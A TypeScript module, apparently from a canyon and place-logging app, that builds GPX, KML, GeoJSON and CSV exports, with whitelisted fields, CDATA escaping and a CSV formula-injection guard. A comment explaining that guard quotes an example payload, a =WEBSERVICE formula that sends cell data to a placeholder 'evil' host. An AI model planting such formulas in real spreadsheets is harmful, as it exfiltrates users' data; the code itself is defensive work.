// A place, or a set of them, as a GPX, KML, GeoJSON or CSV file's text. Both
// clients draw from this one builder so a file leaves Logjam Web and Logjam GPS
// byte for byte alike; only where it goes (a download, a chosen folder) is theirs.
import type { TPlace } from "./apiTypes.js";
import { formatCanyonGrade, isCanyonGradeKey } from "./canyonGrade.js";
import { escapeXml } from "./escapeXml.js";
import { userFieldValues } from "./fieldValues.js";
import { SOURCES_FIELD_KEY } from "./placeTypes.js";
import {
  GEOJSON_MIME_TYPE,
  GPX_MIME_TYPE,
  KML_MIME_TYPE,
} from "./routeExport.js";
import type { TripLogCustomFieldDef } from "./tripLogFields.js";

/** All a description needs of a definition: what to call the value. */
export type ExportFieldLabel = Pick<TripLogCustomFieldDef, "key" | "label">;

export type TExportFormat = "gpx" | "kml" | "geojson" | "csv";

/** The formats a place leaves in, in menu order, with the words for them. */
export const PLACE_EXPORT_FORMATS: { value: TExportFormat; label: string }[] = [
  { value: "gpx", label: "GPX" },
  { value: "kml", label: "KML" },
  { value: "geojson", label: "GeoJSON" },
  { value: "csv", label: "CSV" },
];

export type PlaceExportFile = {
  content: string;
  mimeType: string;
  filename: string;
};

// The user-meaningful place fields we are willing to put in an exported file.
// An explicit whitelist — NEVER spread the raw place record, which
// carries internal identifiers (ownerId, importBatchId, importKey, forkedFromId,
// ropeWikiSnapshot, _count, …) that must not leak into files users hand to third
// parties. These are exactly the columns of the CSV import template, so a GeoJSON
// or CSV export round-trips back through import. `name`, `latitude`, `longitude`
// are handled separately (name is the feature title; coords are the geometry).
const EXPORT_PROPERTY_KEYS = ["altNames", "notes"] as const;

// Grade keys leave through `placeFieldValues` with every other field the
// place's type carries — which is also what lets a campsite export its own
// fields instead of seven canyon columns full of nulls.
//
// `foreignFields` is DELIBERATELY NOT EXPORTED, and this is the one place to
// say why: it holds another user's field labels and values, carried in on a
// copy. Exporting it would put a third party's authored text into a file this
// user hands to a fourth. Same handling `ropeWikiSnapshot` already gets.
function placeSources(c: TPlace): [string, string][] {
  const sources = (c.fieldValues ?? {})[SOURCES_FIELD_KEY];
  return Array.isArray(sources) ? (sources as [string, string][]) : [];
}

// Every value the user can see on the place, WITHOUT the internal `_`-prefixed
// entries (`_sources` leaves separately, in its self-describing form).
function placeFieldValues(c: TPlace): Record<string, unknown> {
  return userFieldValues(c.fieldValues);
}

// Build the whitelisted property object for a GeoJSON feature. Explicit
// assignment per key (no spread) so a future field added to TPlace can't
// silently start leaking through the export. `sources` and `customFields` are
// the two allowed slices of `attributes` — see placeSources/placeCustomFields.
function exportProperties(c: TPlace): Record<string, unknown> {
  return {
    name: c.name,
    altNames: c.altNames,
    notes: c.notes,
    // Self-describing {label, url} objects (friendlier to third parties than
    // the internal positional [label, url] tuples).
    sources: placeSources(c).map(([label, url]) => ({ label, url })),
    // Every field the place's type carries, keyed by definition key. Still one
    // explicit assignment rather than a spread of the record: a future column
    // on TPlace cannot start leaking through here.
    fields: placeFieldValues(c),
  };
}

// A `]]>` inside CDATA content ends the section early — the remainder is then
// parsed as XML markup, so unescaped user text (notes, altNames, sources; a
// place shared with the exporter carries the OWNER's text) can inject
// arbitrary elements into the exported KML. Split the terminator
// across two adjacent CDATA sections, which XML concatenates back into the
// literal text: the standard escape for "]]>" inside CDATA.
function escapeCdata(s: string): string {
  return s.replace(/\]\]>/g, "]]]]><![CDATA[>");
}

/** A field's user-facing label, or its key when no definition describes it —
 *  which is the honest fallback for a value stored under a definition that has
 *  since been deleted, or one that arrived on a copy. */
function fieldLabel(key: string, defs: ExportFieldLabel[]): string {
  return defs.find((def) => def.key === key)?.label ?? key;
}

function descriptionText(c: TPlace, defs: ExportFieldLabel[]): string {
  const parts: string[] = [];
  if (c.altNames.length > 0)
    parts.push(`Also known as: ${c.altNames.join(", ")}`);
  const grade = formatCanyonGrade(placeFieldValues(c));
  if (grade) parts.push(`Canyon grade: ${grade}`);
  // Whatever the place's type carries, in the order the values are stored. The
  // labels a UI would show live on the definitions, which this module does not
  // have; the KEY is what a third-party reader gets, which is the same thing
  // the GeoJSON/CSV forms give them.
  for (const [key, value] of Object.entries(placeFieldValues(c))) {
    if (value === null || value === undefined || value === "") continue;
    if (isCanyonGradeKey(key)) continue;
    parts.push(`${fieldLabel(key, defs)}: ${String(value)}`);
  }
  if (c.notes) parts.push(`Notes: ${c.notes}`);
  const sources = placeSources(c);
  if (sources.length > 0) {
    parts.push(
      `Sources: ${sources
        .map(([label, url]) => (url ? `${label} (${url})` : label))
        .join(", ")}`,
    );
  }
  return parts.join("\n");
}

function filenameSlug(name: string): string {
  return name
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-|-$/g, "");
}

function dateStamp(): string {
  return new Date().toISOString().slice(0, 10).replace(/-/g, "");
}

function buildFilename(places: TPlace[], ext: TExportFormat): string {
  if (places.length === 1) {
    return `logjam-${filenameSlug(places[0].name)}.${ext}`;
  }
  return `logjam-places-${dateStamp()}.${ext}`;
}

function placesToGpx(places: TPlace[], defs: ExportFieldLabel[]): string {
  const wpts = places
    .map((c) => {
      const desc = descriptionText(c, defs);
      return [
        `  <wpt lat="${c.latitude}" lon="${c.longitude}">`,
        `    <name>${escapeXml(c.name)}</name>`,
        desc ? `    <desc>${escapeXml(desc)}</desc>` : "",
        `    <time>${c.updatedAt}</time>`,
        `  </wpt>`,
      ]
        .filter(Boolean)
        .join("\n");
    })
    .join("\n");

  const xml = [
    `<?xml version="1.0" encoding="UTF-8"?>`,
    `<gpx version="1.1" creator="Logjam" xmlns="http://www.topografix.com/GPX/1/1">`,
    wpts,
    `</gpx>`,
  ].join("\n");

  return xml;
}

function placesToKml(places: TPlace[], defs: ExportFieldLabel[]): string {
  const placemarks = places
    .map((c) => {
      const desc = descriptionText(c, defs);
      return [
        `  <Placemark>`,
        `    <name>${escapeXml(c.name)}</name>`,
        desc
          ? `    <description><![CDATA[${escapeCdata(desc)}]]></description>`
          : "",
        `    <Point><coordinates>${c.longitude},${c.latitude},0</coordinates></Point>`,
        `  </Placemark>`,
      ]
        .filter(Boolean)
        .join("\n");
    })
    .join("\n");

  const xml = [
    `<?xml version="1.0" encoding="UTF-8"?>`,
    `<kml xmlns="http://www.opengis.net/kml/2.2">`,
    `<Document>`,
    placemarks,
    `</Document>`,
    `</kml>`,
  ].join("\n");

  return xml;
}

function placesToGeoJson(places: TPlace[]): string {
  const features = places.map((c) => ({
    type: "Feature",
    geometry: { type: "Point", coordinates: [c.longitude, c.latitude] },
    // Whitelisted properties only — see exportProperties / EXPORT_PROPERTY_KEYS.
    properties: exportProperties(c),
  }));

  const collection = { type: "FeatureCollection", features };
  return JSON.stringify(collection, null, 2);
}

// Fixed CSV columns, in the order the import template lays them out
// (csvImport/placeTemplate.ts, which generates one per type) so an export can
// be re-imported unchanged, followed by `sources`. altNames serialise
// semicolon-separated, matching the template's "Alt Name 1; Alt Name 2"
// convention and parseAltNames on import. Custom-field (`attr:<key>`) columns
// are appended dynamically per exported set — see placesToCsv.
const CSV_COLUMNS = [
  "name",
  "latitude",
  "longitude",
  ...EXPORT_PROPERTY_KEYS,
  "sources",
] as const;

// Excel/LibreOffice/Sheets treat a cell starting with =, +, -, @ (or a tab/CR
// that a formula scanner skips past) as a formula to evaluate on open — CSV
// injection. A place name/notes/custom-field value like
// `=WEBSERVICE("https://evil/?d="&A1)` survives CSV quoting
// unmodified and executes for whoever opens the file (the
// cross-user path is real — a sharee can export the owner's notes). Prefix a
// `'` so spreadsheet apps render it as inert text; csvField still quotes
// the cell as needed around that prefix.
//
// Only applied to free-text columns (below), NOT to latitude/longitude/the
// numeric grade columns: those are always `String(number)` — a negative
// coordinate ("-33.5") is a valid numeric literal spreadsheet software parses
// as a number rather than evaluating as a formula, and prefixing it would
// corrupt Logjam Web's own CSV round-trip (parseLatLng on re-import).
function neutralizeFormula(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}

// Columns whose cells can carry arbitrary user-authored text (as opposed to
// Logjam Web's own numeric formatting) — the formula-injection guard applies
// only to these.
const CSV_TEXT_COLUMNS = new Set<(typeof CSV_COLUMNS)[number]>([
  "name",
  "altNames",
  "notes",
  "sources",
]);

function csvCell(c: TPlace, column: (typeof CSV_COLUMNS)[number]): string {
  switch (column) {
    case "name":
      return c.name;
    case "latitude":
      return String(c.latitude);
    case "longitude":
      return String(c.longitude);
    case "altNames":
      return c.altNames.join("; ");
    case "notes":
      return c.notes ?? "";
    case "sources": {
      // Serialised as the JSON [[label, url], …] form that parseSources
      // round-trips losslessly (a "; " token join can't preserve a
      // user-authored label on a URL source). Empty cell when there are none.
      const sources = placeSources(c);
      return sources.length > 0 ? JSON.stringify(sources) : "";
    }
    default: {
      // The remaining columns are nullable numbers; empty string for null so the
      // cell round-trips to "no value" rather than the literal "null".
      const value = c[column];
      return value == null ? "" : String(value);
    }
  }
}

// Every FIELD key present across the exported set, sorted for a stable column
// order. Each becomes an `attr:<key>` column the CSV importer auto-maps
// straight back to the matching field role (see detectPlaceColumns).
//
// The seven grade keys arrive through here rather than as fixed columns,
// which is what makes an export of campsites carry `capacity` and no grades,
// and an export of canyons carry the grades and no `capacity`.
function collectFieldKeys(places: TPlace[]): string[] {
  const keys = new Set<string>();
  for (const c of places) {
    for (const key of Object.keys(placeFieldValues(c))) keys.add(key);
  }
  return [...keys].sort();
}

// RFC 4180 quoting, the same cells Papa.unparse quotes: a cell holding a quote,
// comma or line break, or padded with a space. Rows end CRLF.
function csvField(value: string): string {
  return /[",\r\n]|^ | $/.test(value)
    ? `"${value.replace(/"/g, '""')}"`
    : value;
}

function placesToCsv(places: TPlace[]): string {
  const attrKeys = collectFieldKeys(places);
  const header = [...CSV_COLUMNS, ...attrKeys.map((key) => `attr:${key}`)];
  const rows = places.map((c) => {
    const fieldValues = placeFieldValues(c);
    const cells: string[] = CSV_COLUMNS.map((column) => {
      const cell = csvCell(c, column);
      return CSV_TEXT_COLUMNS.has(column) ? neutralizeFormula(cell) : cell;
    });
    for (const key of attrKeys) {
      // Empty cell for places lacking the field; String() for present values
      // (custom-field values re-ingest as strings via the `attr:<key>` role).
      // Custom-field values are free-form user text — formula-injection guard
      // applies here too.
      const value = fieldValues[key];
      cells.push(value == null ? "" : neutralizeFormula(String(value)));
    }
    return cells;
  });
  return [header, ...rows].map((r) => r.map(csvField).join(",")).join("\r\n");
}

/**
 * `defs` label the field values in the human-readable GPX/KML descriptions.
 * They are optional because the machine-readable forms do not need them — CSV
 * and GeoJSON key by `key` so the file round-trips back through import, and a
 * label is not stable enough to key on (a rename would break the round trip).
 * Absent, a description falls back to the key, which is what a value whose
 * definition has been deleted gets anyway.
 */
export function buildPlaceExport(
  places: TPlace[],
  format: TExportFormat,
  defs: ExportFieldLabel[] = [],
): PlaceExportFile {
  const filename = buildFilename(places, format);
  switch (format) {
    case "gpx":
      return {
        content: placesToGpx(places, defs),
        mimeType: GPX_MIME_TYPE,
        filename,
      };
    case "kml":
      return {
        content: placesToKml(places, defs),
        mimeType: KML_MIME_TYPE,
        filename,
      };
    case "geojson":
      return {
        content: placesToGeoJson(places),
        mimeType: GEOJSON_MIME_TYPE,
        filename,
      };
    case "csv":
      return { content: placesToCsv(places), mimeType: "text/csv", filename };
  }
}
